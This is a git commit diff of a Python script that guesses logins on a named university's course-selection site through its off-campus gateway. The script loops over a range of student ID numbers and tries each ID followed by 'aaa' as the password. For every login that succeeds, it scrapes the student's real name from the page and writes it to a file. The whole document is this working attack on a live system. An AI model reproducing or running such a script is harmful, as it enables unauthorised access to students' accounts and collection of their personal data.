f41bf888c677233950248b0439f7086c019a3993
taogewins <taogewins@outlook.com>
2017-07-14 20:16:33 +0800

    lkjsdf

--- tuiclass/TuiKe_(out_web).py
+++ tuiclass/TuiKe_(out_web).py
@@ -1,39 +1,40 @@
+# encoding = utf-8
 import base64, re
-
 from outnetUtil import OutNetLink
 
 # https://ssl.hrbeu.edu.cn/web/1/http/1/edusys.hrbeu.edu.cn/jsxsd/index.jsp 外网正常登录
 # 2015201514 is ok
 
-fo = open("getlist_by_outweb.txt", "w+")
+fo = open("getlist_by_outweb.txt", "w+", encoding='utf-8')
+# 对utf-8文件要用utf-8编码打开。。
 cnt = 0
 
 def getList():
     global cnt, fo
-    for i in range(2015201101, 2015202135):
+    for i in range(2015201514, 2015201515):
         s = OutNetLink.getConn()
         url = 'https://ssl.hrbeu.edu.cn/web/1/http/1/edusys.hrbeu.edu.cn/jsxsd/xk/LoginToXk'
         zh = str(i).encode(encoding="utf-8")
         psw = str(str(i) + 'aaa').encode(encoding="utf-8")
         arg = base64.b64encode(zh) + str('%%%').encode(encoding="utf-8") + base64.b64encode(psw)
         arg = arg.decode()
-        # print(arg, type(arg))
         data = {
             'encoded': arg
         }
         cur = s.post(url=url, data=data)
-        # print(cur.text)
+        #print(cur.text)
+
         fi = re.search(u'用户名或密码错误', cur.text)
         # print(fi)
+
         if fi is None:
+            name = re.search(u'姓名：(.*)<br/>', cur.text)
             cnt = cnt + 1
-            cur = zh.decode() + '  ' + psw.decode() + '\n'
+            cur = zh.decode() + '  ' + name.group(1) + '\n'
             fo.write(cur)
     fo.close()
     print(cnt)
 
-
 if __name__ == '__main__':
-    fo.write('sdf')
     getList()
     fo.close()
